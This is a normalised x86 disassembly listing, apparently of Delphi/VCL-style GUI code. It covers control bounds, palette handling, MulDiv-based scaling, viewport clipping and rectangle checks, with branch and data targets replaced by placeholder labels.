mov [ ebx + 0x74 ] esi
mov [ esi + 0x1c ] ebx
mov [ esi + 0x18 ] sub_43b4e4
mov [ ebx + 0x70 ] 0xff000005
mov [ ebx + 0x57 ] 0x1
mov [ ebx + 0x58 ] 0x1
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x9a ] 0x1
mov [ ebx + 0x60 ] 0x1
mov [ ebx + 0x5e ] 0x0
mov [ ebx + 0x7a ] 0xfff4
mov eax [ r-xdata ]
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x150 ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_439748
push ebx
push esi
push edi
add esp 0xfffffff0
call sub_403524
mov ebx edx
mov edi eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_459324
mov eax [ edi + 0xa0 ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40350c
push edi
xor ecx ecx
mov edx 0xb039
call sub_43b724
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov edx esp
mov eax edi
call sub_439f10
mov ecx esp
or edx 0xffffffff
mov eax edi
mov si 0xffcc
call sub_403394
xor eax eax
mov [ edi + 0xa0 ] eax
jmp r-xdata
mov eax [ edi + 0x6c ]
call sub_403198
xor eax eax
mov [ edi + 0x6c ] eax
mov eax [ edi + 0x74 ]
call sub_403198
mov eax [ edi + 0x68 ]
call sub_403198
mov eax [ edi + 0x64 ]
call sub_408910
mov edx ebx
and dl 0xfc
mov eax edi
call sub_419a9c
test bl bl
jle r-xdata
sub_439814
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
sub_43983c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] dl
mov ebp eax
xor ebx ebx
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
mov si 0xffd7
call sub_403394
mov edi eax
test edi edi
je r-xdata
lea edx [ esp + 0x4 ]
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
mov al [ esp ]
xor al 0x1
neg al
sbb eax eax
push eax
push edi
push esi
call SelectPalette
mov edi eax
push esi
call RealizePalette
test eax eax
je r-xdata
push 0xffffffff
push edi
push esi
call SelectPalette
push esi
mov eax [ esp + 0x8 ]
push eax
call ReleaseDC
mov bl 0x1
mov eax ebp
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4398c4
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x61 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x61 ] al
mov eax ebx
call sub_439bc4
sub_4398e4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
or [ ebx + 0x50 ] 0x8000
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
mov eax [ ebx + 0x6c ]
call sub_403198
xor eax eax
mov [ ebx + 0x6c ] eax
and [ ebx + 0x50 ] 0xffff7fff
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x6c ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_43c540
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_403394
mov edx ebx
mov eax edi
call sub_419b20
mov eax ebx
mov si 0xffd9
call sub_403394
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x6c ] eax
pop edi
pop esi
pop ebx
retn
sub_4399ac
push ebx
push esi
push edi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x8
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_419eb0
and [ ebx + 0x54 ] 0xfff7
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_43b724
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_43b724
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_43b724
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax ebx
call sub_43b724
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_43b724
sub_439a40
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_419d6c
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x7c ]
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp edi eax
jne r-xdata
xor edx edx
mov eax esi
call sub_43a528
jmp r-xdata
xor edx edx
mov eax esi
call sub_4398e4
sub_439a84
push ebx
push esi
push edi
push ecx
mov ebx edx
mov edi eax
mov al [ edi + 0x5b ]
cmp bl al
je r-xdata
mov eax edi
mov si 0xffd0
call sub_403394
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] al
mov [ edi + 0x5b ] bl
xor eax eax
mov al bl
mov dl [ eax + rw-data ]
mov eax edi
call sub_4398c4
test [ edi + 0x1c ] 0x1
jne r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
cmp bl 0x6
je r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
cmp [ esp ] 0x6
je r-xdata
mov al [ esp ]
dec eax
sub al 0x2
setb al
mov edx ebx
add dl 0xfd
sub dl 0x2
setb dl
cmp al dl
jne r-xdata
mov eax edi
mov si 0xffee
call sub_403394
mov al [ esp ]
test al al
je r-xdata
sub al 0x5
je r-xdata
test bl bl
je r-xdata
sub bl 0x5
je r-xdata
mov eax [ edi + 0x4c ]
push eax
mov eax [ edi + 0x48 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx [ edi + 0x40 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
sub_439b2c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea ecx [ ebp + 0x8 ]
lea edx [ ebp + 0xc ]
mov eax ebx
call sub_43bcb4
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp esi [ ebx + 0x40 ]
jne r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_43a9b8
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_439bc4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
push 0x0
xor ecx ecx
mov edx 0x47
mov eax ebx
call sub_43b724
mov eax ebx
mov si 0xffd0
call sub_403394
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov eax ebx
mov si 0xffcf
call sub_403394
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
sub_439bc4
push ebx
push esi
add esp 0xfffffff0
mov esi eax
cmp [ esi + 0x62 ] 0x0
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
jne r-xdata
mov bl [ esi + 0x61 ]
mov al [ r-xdata ]
cmp al bl
jne r-xdata
test bl 0x4
je r-xdata
xor eax eax
mov [ esi + 0x90 ] eax
xor eax eax
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
sar eax 0x1
jns r-xdata
test bl 0x1
je r-xdata
add eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
adc eax 0x0
mov eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
sar eax 0x1
jns r-xdata
test bl 0x2
je r-xdata
test bl 0x8
je r-xdata
add eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
adc eax 0x0
mov eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
mov [ esi + 0x8c ] eax
jmp r-xdata
test [ ebx + 0x1c ] 0x2
je r-xdata
mov ebx [ esi + 0x30 ]
test ebx ebx
je r-xdata
mov eax ebx
call sub_44105c
test al al
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x48 ]
mov [ esi + 0x90 ] eax
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x4c ]
mov [ esi + 0x94 ] eax
mov edx esp
mov eax [ esi + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ esi + 0x90 ] eax
mov eax [ esp + 0xc ]
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ ebx + 0x1fa ]
mov [ esi + 0x90 ] eax
mov eax [ ebx + 0x1fe ]
mov [ esi + 0x94 ] eax
jmp r-xdata
sub_439ce0
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x1
pop esi
pop ebx
retn
sub_439d04
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx edx
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x2
pop esi
pop ebx
retn
sub_439d2c
push ebx
push esi
mov esi eax
push edx
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x4
pop esi
pop ebx
retn
sub_439d50
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
push edx
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x8
pop esi
pop ebx
retn
sub_439d74
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp ebx [ eax + 0xa0 ]
je r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x400
xor edx edx
push ebp
push sub_439e6f
push [ fs : edx ]
mov [ fs : edx ] esp
cmp ebx 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
cmp ebx eax
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffe4
call sub_403394
test ebx ebx
je r-xdata
cmp [ eax + 0x178 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439e76
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfbff
retn
mov edi eax
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xffffffff
je r-xdata
mov eax [ eax + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_4141dc
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
cmp [ ebx + 0x178 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffbf
call sub_403394
test edi edi
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc5
call sub_403394
jmp r-xdata
mov eax [ ebx + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_413eec
sub_439e80
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403324
test al al
jne r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_43a9b8
mov edx edi
mov eax ebx
call sub_439f30
mov edx edi
mov eax ebx
call sub_43b7c8
jmp r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
cmp esi 0xffffffff
jne r-xdata
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_439eec
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
lea eax [ ebx + 0x154 ]
mov edx esi
call sub_403f3c
pop esi
pop ebx
retn
mov [ ebx + 0x150 ] 0x0
sub_439f30
push ebx
push esi
push edi
push ebp
mov esi eax
mov eax [ edx + 0x8 ]
mov edi [ edx ]
sub eax edi
push eax
mov eax [ edx + 0xc ]
mov ebp [ edx + 0x4 ]
sub eax ebp
push eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
pop ebp
pop edi
pop esi
pop ebx
retn
sub_439f8c
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_439fb8
mov edx eax
mov ecx esp
mov eax esi
call sub_412bb8
mov edx esp
mov eax ebx
call sub_43a3fc
pop ecx
pop edx
pop esi
pop ebx
retn
sub_439fd0
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_439f74
mov ecx esp
mov edx esi
call sub_412bb8
mov edx esp
mov eax ebx
call sub_43a3fc
pop ecx
pop edx
pop esi
pop ebx
retn
sub_439ff8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43a079
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebx + 0x40 ]
add [ esi ] eax
mov eax [ ebx + 0x44 ]
add [ esi + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a080
lea eax [ ebp - 0xc ]
call sub_403ee8
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba04
call sub_403924
sub_43a088
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
add eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
add eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_43a0b4
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
sub eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_43a0e0
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
mov edx esi
mov eax ebx
call sub_4557e8
sub_43a110
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebx + 0xa0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ rw-data ] 0x0
jne r-xdata
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov [ ebp - 0x10 ] edi
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx ebx
mov edx 0xb042
mov eax esi
call sub_43b724
sub_43a18c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov edi edx
mov esi eax
cmp edi [ esp ]
je r-xdata
mov al [ r-xdata ]
mov [ esi + 0x98 ] al
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
je r-xdata
mov bl [ r-xdata ]
mov bl [ esi + 0x98 ]
jmp r-xdata
mov ebp [ esi + 0x40 ]
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
push eax
call MulDiv
mov ebp eax
jmp r-xdata
test bl 0x1
je r-xdata
mov eax [ esi + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0x4 ] eax
jmp r-xdata
test bl 0x2
je r-xdata
mov eax [ esi + 0x48 ]
mov [ esp + 0x8 ] eax
test [ esi + 0x51 ] 0x1
jne r-xdata
test bl 0x4
je r-xdata
mov eax [ esi + 0x4c ]
mov [ esp + 0xc ] eax
test [ esi + 0x51 ] 0x2
jne r-xdata
test bl 0x1
je r-xdata
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x90 ]
push eax
call MulDiv
mov [ esi + 0x90 ] eax
test bl 0x8
setne dl
test al al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x48 ]
push eax
call MulDiv
mov [ esp + 0x8 ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
add eax [ esi + 0x48 ]
push eax
call MulDiv
sub eax ebp
mov [ esp + 0x8 ] eax
jmp r-xdata
cmp [ esi + 0x59 ] 0x0
jne r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x94 ]
push eax
call MulDiv
mov [ esi + 0x94 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0xc ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
add eax [ esi + 0x4c ]
push eax
call MulDiv
sub eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
test bl 0x8
setne al
test al al
je r-xdata
test bl 0x10
je r-xdata
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov ecx [ esp + 0xc ]
mov edx ebp
mov eax esi
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov ebx [ esi + 0x68 ]
mov eax ebx
call sub_41d0a8
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_41d0c4
sub_43a358
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_43a3ee
push [ fs : eax ]
mov [ fs : eax ] esp
test [ edi + 0x50 ] 0x20
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_419fa8
test bl bl
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_43a570
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x8 ]
call sub_4042f4
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a3f5
lea eax [ ebp - 0x8 ]
call sub_403ee8
retn
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_43a5a0
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
mov bl 0x1
mov eax esi
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
test [ esi + 0x1c ] 0x1
je r-xdata
sub_43a3fc
push ebx
push esi
push edi
add esp 0xffffffe8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x48 ]
sub eax [ esp + 0x10 ]
add eax [ esp ]
push eax
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x18 ]
add eax [ esp + 0x8 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
sub_43a444
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
jne r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
call sub_403924
test esi esi
je r-xdata
mov edx ebx
call sub_43d9d0
mov edx ebx
mov eax esi
call sub_43d8fc
mov eax ebx
call sub_439bc4
sub_43a490
push ebx
push esi
push edi
mov ebx edx
mov edi eax
cmp bl [ edi + 0x57 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
mov si 0xffcd
call sub_403394
mov [ edi + 0x57 ] bl
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb00b
mov eax edi
call sub_43b724
mov eax edi
mov si 0xffd0
call sub_403394
sub_43a528
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x7c ] esi
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_44e764
mov edx ebx
mov eax esi
call sub_419b20
sub_43a54c
push ebx
mov ebx eax
push edx
xor ecx ecx
mov eax ebx
mov edx 0xc
call sub_43b724
push 0x0
xor ecx ecx
mov edx 0xb012
mov eax ebx
call sub_43b724
pop ebx
retn
sub_43a570
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_43a4e4
mov ebx eax
mov eax edi
mov ecx ebx
xor edx edx
call sub_403fd8
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
lea ecx [ ebx + 0x1 ]
mov edx [ edi ]
mov eax esi
call sub_43a4f4
sub_43a5a0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43a5f5
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43a570
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_4042f4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a5fc
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
mov eax esi
call sub_4043a8
mov edx eax
mov eax ebx
call sub_43a54c
sub_43a620
push ebx
mov ebx eax
mov [ ebx + 0x59 ] 0x0
mov [ ebx + 0x56 ] 0x0
mov eax [ ebx + 0x68 ]
call sub_41d004
cmp eax [ ebx + 0x84 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb00e
mov eax ebx
call sub_43b724
pop ebx
retn
or [ ebx + 0x98 ] 0x10
mov eax [ ebx + 0x68 ]
call sub_41d004
mov [ ebx + 0x84 ] eax
sub_43a7a8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_43a798
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor eax eax
call sub_437740
mov eax esi
call sub_437740
jmp r-xdata
sub_43a7e0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x198 ]
mov edx ebx
call sub_4140f4
test eax eax
jl r-xdata
mov edx [ ebx + 0x30 ]
mov edi [ edx + 0x198 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_413f38
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x198 ]
mov ecx ebx
mov edx esi
call sub_414114
mov cl 0x1
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_43a9b8
mov eax ebx
call sub_451738
test [ eax + 0x54 ] 0x4
je r-xdata
mov dl 0x1
mov si 0xffd1
call sub_403394
sub_43a860
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
retn
test dl dl
je r-xdata
xor edx edx
call sub_43a7e0
mov edx [ ecx + 0x198 ]
mov edx [ edx + 0x8 ]
dec edx
call sub_43a7e0
jmp r-xdata
sub_43a884
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_43a91a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
push 0x0
mov eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x40 ]
push eax
push esi
call SetViewportOrgEx
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a921
lea eax [ ebp - 0xc ]
call sub_403ee8
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba04
call sub_403924
sub_43a92c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov edi [ eax + 0x198 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax edi
call sub_4140f4
mov esi eax
test esi esi
jle r-xdata
mov [ ebp - 0x1 ] 0x0
dec esi
mov edx esi
mov eax edi
call sub_414098
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test esi esi
jg r-xdata
test [ ebx + 0x50 ] 0x40
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_439f10
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call IntersectRect
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call EqualRect
test eax eax
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43a9b8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x15 ] cl
mov ebx edx
mov [ ebp - 0x4 ] eax
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_44105c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_439f10
cmp [ ebp - 0x15 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
